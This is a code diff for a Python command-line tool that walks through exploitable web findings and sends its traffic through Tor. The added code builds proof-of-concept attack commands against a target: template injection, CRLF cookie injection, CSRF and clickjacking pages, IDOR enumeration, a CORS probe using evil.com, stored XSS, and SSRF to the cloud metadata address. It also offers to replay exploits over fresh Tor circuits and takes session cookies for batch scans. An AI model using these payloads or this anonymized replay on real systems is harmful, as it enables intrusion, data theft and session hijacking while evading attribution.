@@ -988,7 +988,8 @@ def _intel_exploit_walkthrough(tor_proxy: str):
         except ImportError:
             err("cryptography package needed to read encrypted reports.")
             return
-        key = prompt("Enter decryption key for the report")
+        import getpass as _gp
+        key = _gp.getpass("  Enter decryption key: ")
         if not key:
             return
         try:
@@ -1061,34 +1062,60 @@ def _intel_exploit_walkthrough(tor_proxy: str):
                        f'-H "Content-Type: application/json" '
                        f'-d \'{{ "query": "{{ __schema {{ types {{ name }} }} }}" }}\' '
                        f'"[TARGET]{path_info}"')
+            elif etype == "ssti" and param:
+                poc = f'curl {_sp} "[TARGET]?{param}={{{{7*7}}}}"'
+            elif etype == "crlf" and param:
+                poc = f'curl -v {_sp} "[TARGET]?{param}=%0d%0aSet-Cookie:%20pwned=1"'
+            elif etype == "csrf":
+                poc = f'<form method="POST" action="[TARGET]"><input name="{param}" value="evil"></form>'
+            elif etype == "idor" and param:
+                poc = f'for i in $(seq 1 20); do curl -s {_sp} "[TARGET]?{param}=$i"; done'
+            elif etype == "clickjacking":
+                poc = '<iframe src="[TARGET]" style="opacity:0;width:100%;height:100%"></iframe>'
+            elif etype == "cors_misconfiguration":
+                poc = f'curl -v {_sp} -H "Origin: https://evil.com" "[TARGET]"'
+            elif etype == "csp_bypass":
+                poc = "# CSP allows unsafe-inline/eval — any XSS vector will execute"
+            elif etype == "stored_xss" and param:
+                rp = ei.get("render_path", "/")
+                poc = f'curl {_sp} -d "{param}=<script>alert(1)</script>" "[TARGET]{path_info}"\ncurl {_sp} "[TARGET]{rp}"'
+            elif etype == "ssrf" and param:
+                poc = f'curl {_sp} "[TARGET]?{param}=http://169.254.169.254/latest/meta-data/"'
 
         if poc:
             print(f"  {B}PoC:{N}")
             print(f"    {D}{poc}{N}")
         print()
 
-        print(f"  Options:")
-        print(f"    {G}y{N} — verify this exploit (re-sends payload through new Tor circuit)")
-        print(f"    {G}p{N} — show full PoC details")
-        print(f"    {G}n{N} — skip to next finding")
-        print(f"    {G}q{N} — quit walkthrough")
-        print()
-        choice = prompt(f"  [{i+1}/{len(exploitable)}] Choose", "n").lower()
+        while True:
+            print(f"  Options:")
+            print(f"    {G}y{N} — verify this exploit (re-sends payload through new Tor circuit)")
+            print(f"    {G}p{N} — show full PoC details")
+            print(f"    {G}n{N} — skip to next finding")
+            print(f"    {G}q{N} — quit walkthrough")
+            print()
+            choice = prompt(f"  [{i+1}/{len(exploitable)}] Choose", "n").lower()
+
+            if choice == "p":
+                print(f"\n  {B}Full PoC Details:{N}")
+                if ei.get("method"):
+                    print(f"  Method: {ei['method']}")
+                if ei.get("risk"):
+                    print(f"  Risk: {ei['risk']}")
+                if poc:
+                    for _poc_line in poc.split("\n"):
+                        print(f"  {_poc_line}")
+                if ei.get("render_path"):
+                    print(f"  Render path: {ei['render_path']}")
+                if ei.get("xss_context"):
+                    print(f"  XSS context: {ei['xss_context']}")
+                print()
+                continue  # Re-prompt on same finding
+            break  # Any other choice exits the inner loop
 
         if choice == "q":
             info("Walkthrough ended.")
             break
-
-        if choice == "p":
-            # Show full PoC details
-            print(f"\n  {B}Full PoC Details:{N}")
-            if ei.get("method"):
-                print(f"  Method: {ei['method']}")
-            if ei.get("risk"):
-                print(f"  Risk: {ei['risk']}")
-            if poc:
-                print(f"  Command: {poc}")
-            print()
 
         if choice in ("y", "yes"):
             # Rate limiting: enforce delay between replay attempts
@@ -1305,6 +1332,12 @@ def flow_intel(detected_port=None):
         if depth not in ("quick", "full", "deep"):
             depth = "full"
         args = ["--file", filepath, "--scan", depth, "--tor-proxy", tor]
+        cookie_input = prompt("Session cookies (name=value, comma-separated, or Enter to skip)", "")
+        if cookie_input.strip():
+            for ck in cookie_input.split(","):
+                ck = ck.strip()
+                if "=" in ck:
+                    args.extend(["--cookie", ck])
         run_script(INTEL / "testergatherSystem", args, "Batch intel")
 
     else:
